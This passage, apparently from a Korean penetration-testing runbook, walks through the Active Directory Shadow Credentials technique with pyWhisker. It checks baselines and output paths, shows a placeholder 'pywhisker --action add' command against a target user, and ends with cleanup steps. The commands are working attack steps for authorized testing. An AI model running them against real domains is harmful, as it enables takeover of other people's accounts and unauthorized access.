...
| 필요한 파일·목록·주소 | 변경 전 DeviceID 목록, DC 주소, 생성될 PFX·ccache의 안전한 고유 경로 확보 | `--action list`, `test -e`와 로컬 출력 경로 확인 | 기존 목록과 파일 기준선을 기록하기 전에는 추가 작업을 진행하지 않음 |
...
현재 작업 디렉터리에서 pyWhisker가 만들 `<SHADOW_PFX_BASENAME>.pfx`와 TGT 출력 경로가 기존 파일이 아님을 먼저 확인한다. 설치된 pyWhisker에 `-f/--filename` 옵션이 있는 버전에서만 아래 고정 이름을 사용한다. 공식 구현의 `add` 동작은 `--filename` 값에 `.pfx`를 붙여 저장하므로 확장자가 없는 고유 basename을 전달한다.

```bash
test ! -e '<SHADOW_PFX_BASENAME>.pfx'
test ! -e '<SHADOW_CCACHE_PATH>'
```

```bash
pywhisker --dc-ip <DC_IP> -d <DOMAIN> -u <REQUESTER> -p '<PASSWORD>' --target <TARGET_USER> --action add --filename '<SHADOW_PFX_BASENAME>'
```
...
```bash
unset KRB5CCNAME
rm -- '<SHADOW_PFX_BASENAME>.pfx' '<SHADOW_CCACHE_PATH>'
test ! -e '<SHADOW_PFX_BASENAME>.pfx'
test ! -e '<SHADOW_CCACHE_PATH>'
```
...
- [pyWhisker 공식 구현과 `--filename`·`--device-id` 옵션](https://github.com/ShutdownRepo/pywhisker/blob/main/pywhisker/pywhisker.py)
